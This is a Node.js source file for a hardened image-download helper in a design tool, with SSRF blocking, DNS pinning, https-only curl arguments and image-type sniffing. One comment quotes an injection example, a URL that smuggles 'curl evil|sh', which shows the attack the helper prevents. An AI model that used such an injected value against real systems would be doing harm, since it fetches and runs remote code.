#!/usr/bin/env node
// _fetch-asset.mjs — hardened download-first helper behind `maude design
// fetch-asset` (DDR-062 dispatch; DDR-147 § Security follow-up item 1).
//
// WHY THIS EXISTS: the moodboard (`/design:setup-ds` Stage 3) and DS specimens
// fill photo slots with imagery the research pass harvests off the web. An
// external `<img src="https://…">` hotlink is blocked by the canvas iframe CSP
// (`img-src 'self' data: blob:`, ALWAYS on under the default DDR-054 origin
// split) and is browser-context-flaky even where it isn't — so DDR-147 made
// download-first the rule: fetch to a LOCAL asset, reference the local path.
// But the download is a confused-deputy sink: every `reference_images[].url`
// is ATTACKER-CONTROLLED (it came from a page the research pass ingested) and
// `<designRoot>/assets/` is VERSIONED (it commits + syncs to peers, DDR-054).
// So this helper is the ONE reviewable place that does the fetch safely:
//
//   • fixed, non-interpolated curl args — the URL is passed as a single argv
//     element after `--`, never spliced into a shell string (closes the
//     `https://x/a.png";curl evil|sh;"` shell-injection RCE that a hand-authored
//     prose `curl` recipe transcribed by an agent would open),
//   • https-only, no redirects, size + time caps, no-proxy,
//   • a RESOLVED-IP SSRF gate (reject loopback / link-local / RFC-1918 / CGNAT /
//     multicast / reserved, v4 AND v6, incl. IPv4-mapped + NAT64 embeds) with
//     DNS PINNING via `--resolve` so a rebinding TOCTOU can't swap a validated
//     public IP for 169.254.169.254 between the check and the connect,
//   • a magic-byte image sniff (png/jpg/gif/webp; SVG/HTML/script → reject),
//   • a content-addressed `<sha8>.<ext>` filename (`[a-z0-9._-]` only) written
//     FLAT under `<designRoot>/assets/` with a realpath containment assertion —
//     mirroring the `/_api/asset` route's convention so the reference form
//     `/assets/<sha8>.<ext>` serves on BOTH the main and the segregated canvas
//     origin (the nested `assets/moodboard/<ds>/` layout 404'd on the canvas
//     origin's flat-only `/assets/` gate — the second half of the bug this fixes).
//
// Reached via `maude design fetch-asset <url> --root <repo>`, never a raw path.
// stdout on success = the canvas reference path (one line), so the caller can do
//   REF=$(maude design fetch-asset "$URL" --root "$REPO") && <use $REF> || <scrap>
// Exit: 0 ok · 2 usage · 3 SSRF/validation reject · 4 download/http error ·
//       5 unsupported media type · 6 write/containment error · 1 other.

import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { lookup } from 'node:dns/promises';
import { existsSync, mkdirSync, readFileSync, renameSync, rmSync } from 'node:fs';
import { isIP } from 'node:net';
import { join, resolve, sep } from 'node:path';
import { pathToFileURL } from 'node:url';

// A real browser UA — some CDNs (wikimedia) 403 a bare curl/UA; the memory
// `canvas-images-download-first` documents this. Fixed string, never templated.
const BROWSER_UA =
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

// Images keep the tighter 10 MB cap (mirrors api.ts ASSET_MAX_BYTES for the
// image category). Override for a giant hero via --max-bytes.
const DEFAULT_MAX_BYTES = 10 * 1024 * 1024;
const DEFAULT_MAX_TIME = 20; // seconds — whole transfer

// ── IPv4 ───────────────────────────────────────────────────────────────────

/** Parse a dotted-quad into a 4-byte array, or null if not a valid IPv4. */
export function parseIPv4(str) {
  if (typeof str !== 'string') return null;
  const parts = str.split('.');
  if (parts.length !== 4) return null;
  const bytes = new Uint8Array(4);
  for (let i = 0; i < 4; i += 1) {
    const p = parts[i];
    // No leading-zero octets (avoids octal ambiguity), digits only, 0..255.
    if (!/^\d{1,3}$/.test(p)) return null;
    if (p.length > 1 && p[0] === '0') return null;
    const n = Number(p);
    if (n > 255) return null;
    bytes[i] = n;
  }
  return bytes;
}

/**
 * Return a block-reason string if this IPv4 is a private / loopback / link-local
 * / reserved address that egress must never reach, else null (public → allowed).
 */
export function classifyIPv4(bytes) {
  const [a, b] = bytes;
  if (a === 0) return 'ipv4 0.0.0.0/8 (this-network)';
  if (a === 10) return 'ipv4 10.0.0.0/8 (private)';
  if (a === 127) return 'ipv4 127.0.0.0/8 (loopback)';
  if (a === 100 && b >= 64 && b <= 127) return 'ipv4 100.64.0.0/10 (CGNAT)';
  if (a === 169 && b === 254) return 'ipv4 169.254.0.0/16 (link-local incl. IMDS)';
  if (a === 172 && b >= 16 && b <= 31) return 'ipv4 172.16.0.0/12 (private)';
  if (a === 192 && b === 0 && bytes[2] === 0) return 'ipv4 192.0.0.0/24 (IETF)';
  if (a === 192 && b === 0 && bytes[2] === 2) return 'ipv4 192.0.2.0/24 (TEST-NET-1)';
  if (a === 192 && b === 168) return 'ipv4 192.168.0.0/16 (private)';
  if (a === 198 && (b === 18 || b === 19)) return 'ipv4 198.18.0.0/15 (benchmark)';
  if (a >= 224 && a <= 239) return 'ipv4 224.0.0.0/4 (multicast)';
  if (a >= 240) return 'ipv4 240.0.0.0/4 (reserved/broadcast)';
  return null;
}

// ── IPv6 ───────────────────────────────────────────────────────────────────

/** Parse an IPv6 string (incl. `::`, zone id, embedded IPv4) into 16 bytes. */
export function parseIPv6(str) {
  if (typeof str !== 'string') return null;
  let s = str.trim();
  const zone = s.indexOf('%');
  if (zone !== -1) s = s.slice(0, zone); // drop scope id (fe80::1%en0)

  // Embedded trailing IPv4 (::ffff:1.2.3.4 or 64:ff9b::1.2.3.4) → two hextets.
  if (s.includes('.')) {
    const idx = s.lastIndexOf(':');
    if (idx === -1) return null;
    const v4 = parseIPv4(s.slice(idx + 1));
    if (!v4) return null;
    const h1 = ((v4[0] << 8) | v4[1]).toString(16);
    const h2 = ((v4[2] << 8) | v4[3]).toString(16);
    s = `${s.slice(0, idx + 1)}${h1}:${h2}`;
  }

  const halves = s.split('::');
  if (halves.length > 2) return null;
  const head = halves[0] ? halves[0].split(':') : [];
  const tail = halves.length === 2 ? (halves[1] ? halves[1].split(':') : []) : null;

  let groups;
  if (tail === null) {
    if (head.length !== 8) return null; // no '::' ⇒ must be exactly 8 groups
    groups = head;
  } else {
    const missing = 8 - (head.length + tail.length);
    if (missing < 1) return null; // '::' must stand for ≥1 zero group
    groups = [...head, ...Array(missing).fill('0'), ...tail];
  }
  if (groups.length !== 8) return null;

  const bytes = new Uint8Array(16);
  for (let i = 0; i < 8; i += 1) {
    const g = groups[i];
    if (!/^[0-9a-fA-F]{1,4}$/.test(g)) return null;
    const v = Number.parseInt(g, 16);
    bytes[i * 2] = (v >> 8) & 0xff;
    bytes[i * 2 + 1] = v & 0xff;
  }
  return bytes;
}

/** Block-reason for an IPv6 (16 bytes), or null if public/allowed. */
export function classifyIPv6(bytes) {
  const b = bytes;
  const allZeroThrough = (n) => b.slice(0, n).every((x) => x === 0);

  if (allZeroThrough(16)) return 'ipv6 :: (unspecified)';
  if (allZeroThrough(15) && b[15] === 1) return 'ipv6 ::1 (loopback)';
  if (b[0] === 0xfe && (b[1] & 0xc0) === 0x80) return 'ipv6 fe80::/10 (link-local)';
  if ((b[0] & 0xfe) === 0xfc) return 'ipv6 fc00::/7 (unique-local)';
  if (b[0] === 0xff) return 'ipv6 ff00::/8 (multicast)';

  // IPv4-mapped ::ffff:0:0/96 — classify the embedded v4 (the real target).
  if (allZeroThrough(10) && b[10] === 0xff && b[11] === 0xff) {
    const reason = classifyIPv4(b.slice(12, 16));
    return reason ? `ipv4-mapped ${reason}` : null;
  }
  // NAT64 well-known prefix 64:ff9b::/96 — classify the embedded v4 too.
  if (
    b[0] === 0x00 &&
    b[1] === 0x64 &&
    b[2] === 0xff &&
    b[3] === 0x9b &&
    allZeroThroughRange(b, 4, 12)
  ) {
    const reason = classifyIPv4(b.slice(12, 16));
    return reason ? `nat64 ${reason}` : null;
  }
  return null;
}

function allZeroThroughRange(b, from, to) {
  for (let i = from; i < to; i += 1) if (b[i] !== 0) return false;
  return true;
}

/**
 * Classify any IP literal string. Returns a block-reason (truthy) if egress to
 * it is forbidden, null if allowed, and 'unparseable address' if it isn't a
 * valid IP (fail-closed — the caller rejects on any non-null).
 */
export function classifyAddress(addr) {
  const kind = isIP(addr);
  if (kind === 4) {
    const bytes = parseIPv4(addr);
    return bytes ? classifyIPv4(bytes) : 'unparseable ipv4';
  }
  if (kind === 6) {
    const bytes = parseIPv6(addr);
    return bytes ? classifyIPv6(bytes) : 'unparseable ipv6';
  }
  return 'not an ip address';
}

// ── URL target ───────────────────────────────────────────────────────────────

/**
 * Validate the URL is a plain https target and pull out {host, port}. Throws a
 * FetchAssetError (code 3) on anything else — non-https scheme, embedded
 * credentials, missing host.
 */
export function parseHttpsTarget(rawUrl) {
  let u;
  try {
    u = new URL(rawUrl);
  } catch {
    throw new FetchAssetError(3, `not a valid URL: ${truncate(rawUrl)}`);
  }
  if (u.protocol !== 'https:') {
    throw new FetchAssetError(3, `only https:// is allowed (got ${u.protocol}//)`);
  }
  if (u.username || u.password) {
    throw new FetchAssetError(3, 'URLs with embedded credentials are refused');
  }
  const host = u.hostname;
  if (!host) throw new FetchAssetError(3, 'URL has no host');
  const port = u.port ? Number(u.port) : 443;
  if (!Number.isInteger(port) || port < 1 || port > 65535) {
    throw new FetchAssetError(3, `bad port ${u.port}`);
  }
  return { host, port };
}

// ── image sniff + naming ─────────────────────────────────────────────────────

/**
 * Magic-byte sniff — png/jpg/gif/webp only. Mirrors api.ts sniffImageType so
 * this lane and the /_api/asset route agree. SVG (XML text) matches nothing →
 * null → rejected, so a script-bearing vector can't ride in as an "image".
 * Bytes decide the extension; the URL/Content-Type is never trusted.
 */
export function sniffImageExt(b) {
  if (
    b.length >= 8 &&
    b[0] === 0x89 &&
    b[1] === 0x50 &&
    b[2] === 0x4e &&
    b[3] === 0x47 &&
    b[4] === 0x0d &&
    b[5] === 0x0a &&
    b[6] === 0x1a &&
    b[7] === 0x0a
  ) {
    return 'png';
  }
  if (b.length >= 3 && b[0] === 0xff && b[1] === 0xd8 && b[2] === 0xff) return 'jpg';
  if (
    b.length >= 6 &&
    b[0] === 0x47 &&
    b[1] === 0x49 &&
    b[2] === 0x46 &&
    b[3] === 0x38 &&
    (b[4] === 0x37 || b[4] === 0x39) &&
    b[5] === 0x61
  ) {
    return 'gif';
  }
  if (
    b.length >= 12 &&
    b[0] === 0x52 &&
    b[1] === 0x49 &&
    b[2] === 0x46 &&
    b[3] === 0x46 &&
    b[8] === 0x57 &&
    b[9] === 0x45 &&
    b[10] === 0x42 &&
    b[11] === 0x50
  ) {
    return 'webp';
  }
  return null;
}

/** Content-addressed name `<sha8>.<ext>` — same shape the /_api/asset route uses. */
export function assetName(bytes, ext) {
  const sha8 = createHash('sha256').update(bytes).digest('hex').slice(0, 8);
  const name = `${sha8}.${ext}`;
  // Defense-in-depth: the shape is machine-generated, but assert the charset
  // contract the untrusted-fetch rails promise (`[a-z0-9._-]`, no path segment).
  if (!/^[a-z0-9]{8}\.(png|jpg|gif|webp)$/.test(name)) {
    throw new FetchAssetError(6, `generated name failed the charset contract: ${name}`);
  }
  return name;
}

/**
 * Resolve `<root>/<designRootRel>/assets/<name>` and assert it stays inside the
 * assets dir (realpath containment — poisoned designRoot / traversal backstop).
 */
export function containedAssetPath(root, designRootRel, name) {
  const rootAbs = resolve(root);
  const assetsDir = resolve(rootAbs, designRootRel, 'assets');
  if (assetsDir !== rootAbs && !assetsDir.startsWith(rootAbs + sep)) {
    throw new FetchAssetError(6, `assets dir escapes root: ${assetsDir}`);
  }
  const fileAbs = resolve(assetsDir, name);
  if (fileAbs !== join(assetsDir, name) || !fileAbs.startsWith(assetsDir + sep)) {
    throw new FetchAssetError(6, `resolved asset path escapes assets dir: ${fileAbs}`);
  }
  return { assetsDir, fileAbs };
}

export class FetchAssetError extends Error {
  constructor(code, message) {
    super(message);
    this.code = code;
  }
}

function truncate(s, n = 120) {
  const str = String(s);
  return str.length > n ? `${str.slice(0, n)}…` : str;
}

// ── network (impure) ─────────────────────────────────────────────────────────

/**
 * Resolve the host to IPs, reject if ANY is internal (conservative — a host that
 * also resolves to an internal IP is treated as hostile, defeating a mixed
 * public/internal rebinding answer), and return the public IP to pin to.
 */
export async function resolveSafeIp(host) {
  // An IP literal host is classified directly — no DNS.
  if (isIP(host)) {
    const reason = classifyAddress(host);
    if (reason) throw new FetchAssetError(3, `blocked address ${host} — ${reason}`);
    return host;
  }
  let records;
  try {
    records = await lookup(host, { all: true, verbatim: true });
  } catch (err) {
    throw new FetchAssetError(3, `DNS resolution failed for ${host}: ${err?.code ?? err?.message}`);
  }
  if (!records.length) throw new FetchAssetError(3, `no DNS records for ${host}`);
  for (const { address } of records) {
    const reason = classifyAddress(address);
    if (reason) throw new FetchAssetError(3, `${host} resolves to blocked ${address} — ${reason}`);
  }
  return records[0].address;
}

/**
 * Download <url> to <tmpAbs> with the hardened, fixed curl args, pinning the
 * connection to the pre-validated <pinIp> so no re-resolution (rebinding) can
 * occur. Returns nothing; throws FetchAssetError(4) on any non-200 / transport
 * failure. The URL is the LAST argv element after `--` — never interpolated.
 */
export function curlDownload({ url, host, port, pinIp, tmpAbs, maxBytes, maxTime }) {
  const args = [
    '--proto',
    '=https',
    '--proto-redir',
    '=https',
    '--max-redirs',
    '0', // no redirects — blocks redirect-to-internal SSRF
    '--max-filesize',
    String(maxBytes),
    '--max-time',
    String(maxTime),
    '--connect-timeout',
    String(Math.min(maxTime, 10)),
    '--noproxy',
    '*', // ignore *_PROXY env — no egress via a poisoned proxy
    '-sS',
    '-A',
    BROWSER_UA,
    '--resolve',
    `${host}:${port}:${pinIp}`, // pin — defeats DNS rebinding
    '-o',
    tmpAbs,
    '-w',
    '%{http_code}',
    '--',
    url,
  ];
  let httpCode;
  try {
    httpCode = execFileSync('curl', args, {
      encoding: 'utf8',
      timeout: (maxTime + 5) * 1000,
      maxBuffer: 1024 * 1024,
    }).trim();
  } catch (err) {
    throw new FetchAssetError(4, `curl failed: ${err?.message ?? err}`);
  }
  if (httpCode !== '200') {
    throw new FetchAssetError(
      4,
      `server returned HTTP ${httpCode || '(none)'} (redirects disabled)`
    );
  }
}

// ── orchestration ────────────────────────────────────────────────────────────

/**
 * Full fetch: validate URL → SSRF-gate the resolved IP → download pinned →
 * sniff → content-address → contain → write. Returns
 * { ref, path, name, bytes, ext }. Throws FetchAssetError with a .code.
 */
export async function fetchAsset({
  url,
  root,
  designRootRel = '.design',
  maxBytes = DEFAULT_MAX_BYTES,
  maxTime = DEFAULT_MAX_TIME,
}) {
  const { host, port } = parseHttpsTarget(url);
  const pinIp = await resolveSafeIp(host);

  const { assetsDir } = containedAssetPath(root, designRootRel, 'placeholder.png');
  mkdirSync(assetsDir, { recursive: true });
  const tmpAbs = join(
    assetsDir,
    `.tmp-${createHash('sha256').update(url).digest('hex').slice(0, 12)}`
  );

  try {
    curlDownload({ url, host, port, pinIp, tmpAbs, maxBytes, maxTime });

    let data;
    try {
      data = readFileSync(tmpAbs);
    } catch {
      throw new FetchAssetError(4, 'download produced no file');
    }
    if (data.length === 0) throw new FetchAssetError(4, 'downloaded empty body');
    if (data.length > maxBytes) throw new FetchAssetError(4, `file exceeds ${maxBytes} bytes`);

    const ext = sniffImageExt(data);
    if (!ext) {
      throw new FetchAssetError(5, 'not a png/jpg/gif/webp image (SVG/HTML/script rejected)');
    }

    const name = assetName(data, ext);
    const { fileAbs } = containedAssetPath(root, designRootRel, name);
    // Dedupe — identical bytes hash to the same name.
    if (existsSync(fileAbs)) {
      rmSync(tmpAbs, { force: true });
    } else {
      renameSync(tmpAbs, fileAbs);
    }
    return { ref: `/assets/${name}`, path: `assets/${name}`, name, bytes: data.length, ext };
  } finally {
    rmSync(tmpAbs, { force: true });
  }
}

// ── CLI ──────────────────────────────────────────────────────────────────────

function parseArgv(argv) {
  const out = {
    url: null,
    root: null,
    designRoot: '.design',
    maxBytes: DEFAULT_MAX_BYTES,
    maxTime: DEFAULT_MAX_TIME,
    json: false,
  };
  for (let i = 0; i < argv.length; i += 1) {
    const a = argv[i];
    switch (a) {
      case '--root':
        out.root = argv[++i];
        break;
      case '--design-root':
        out.designRoot = argv[++i];
        break;
      case '--max-bytes':
        out.maxBytes = Number(argv[++i]);
        break;
      case '--max-time':
        out.maxTime = Number(argv[++i]);
        break;
      case '--json':
        out.json = true;
        break;
      case '--help':
      case '-h':
        out.help = true;
        break;
      default:
        if (a.startsWith('-')) throw new FetchAssetError(2, `unknown flag ${a}`);
        if (out.url === null) out.url = a;
        else throw new FetchAssetError(2, `unexpected extra arg ${a}`);
    }
  }
  return out;
}

const HELP = `fetch-asset — hardened download-first image fetch (reached via \`maude design fetch-asset\`)

Usage:
  maude design fetch-asset <https-url> --root <repo> [--design-root .design]
                           [--max-bytes N] [--max-time S] [--json]

Downloads an image over https ONLY, through a resolved-IP SSRF gate + DNS pin,
sniffs the bytes (png/jpg/gif/webp; SVG/HTML rejected), content-addresses it as
<designRoot>/assets/<sha8>.<ext>, and prints the canvas reference path.

On success stdout = the reference path, e.g.  /assets/a44d3d60.png
  REF=$(maude design fetch-asset "$URL" --root "$REPO") && echo "$REF" || echo scrap

Exit: 0 ok · 2 usage · 3 SSRF/validation reject · 4 download/http error ·
      5 unsupported media type · 6 write/containment error · 1 other.`;

async function main() {
  let opts;
  try {
    opts = parseArgv(process.argv.slice(2));
  } catch (err) {
    process.stderr.write(`fetch-asset: ${err.message}\n`);
    process.exit(err instanceof FetchAssetError ? err.code : 2);
  }
  if (opts.help) {
    process.stdout.write(`${HELP}\n`);
    return;
  }
  if (!opts.url) {
    process.stderr.write('fetch-asset: <https-url> required\n');
    process.exit(2);
  }
  const root = opts.root || process.env.CLAUDE_PROJECT_DIR || process.cwd();
  if (!Number.isFinite(opts.maxBytes) || opts.maxBytes <= 0) {
    process.stderr.write('fetch-asset: --max-bytes must be a positive number\n');
    process.exit(2);
  }
  if (!Number.isFinite(opts.maxTime) || opts.maxTime <= 0) {
    process.stderr.write('fetch-asset: --max-time must be a positive number\n');
    process.exit(2);
  }
  try {
    const r = await fetchAsset({
      url: opts.url,
      root,
      designRootRel: opts.designRoot,
      maxBytes: opts.maxBytes,
      maxTime: opts.maxTime,
    });
    process.stdout.write(opts.json ? `${JSON.stringify(r)}\n` : `${r.ref}\n`);
  } catch (err) {
    process.stderr.write(`fetch-asset: ${err.message}\n`);
    process.exit(err instanceof FetchAssetError ? err.code : 1);
  }
}

// Run only when invoked directly (not when imported by the test). This shim runs
// under real `node` on a real on-disk path (never embedded in bun --compile), so
// the classic argv[1] guard is correct here — see the v0.38.0 self-heal memory.
if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main();
}
